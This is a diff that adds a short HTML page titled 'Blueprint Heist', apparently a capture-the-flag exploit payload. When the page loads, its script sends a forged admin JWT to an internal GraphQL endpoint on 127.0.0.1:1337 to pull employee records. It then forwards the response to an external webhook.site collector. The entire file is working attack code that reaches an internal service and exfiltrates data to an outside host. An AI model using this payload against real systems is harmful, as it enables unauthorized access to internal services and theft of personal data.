@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+<body>
+<h1>Blueprint Heist</h1>
+
+<script>
+fetch('http://127.0.0.1:1337/graphql?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3NTI3MTU1MjN9.gnpxI-Fi018qcNB8sBGHcO9WX1TM_ul_EF5t6ZE3ZnM', {
+    method: 'POST',
+    headers: {
+        'Content-Type': 'application/json'
+    },
+    body: JSON.stringify({
+        query: `{
+            getDataByName(name: "John Doe") {
+                name
+                department
+                isPresent
+            }
+        }`
+    })
+})
+.then(response => response.json())
+.then(data => {
+    console.log('GraphQL Response:', data);
+    return fetch('https://webhook.site/a4981f34-8ee2-459c-bfd9-03bb257f2133', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(data)
+    });
+})
+.then(response => console.log('Webhook sent successfully'))
+.catch(error => console.error('Error:', error));
+</script>
+
+
+
+</body></html>
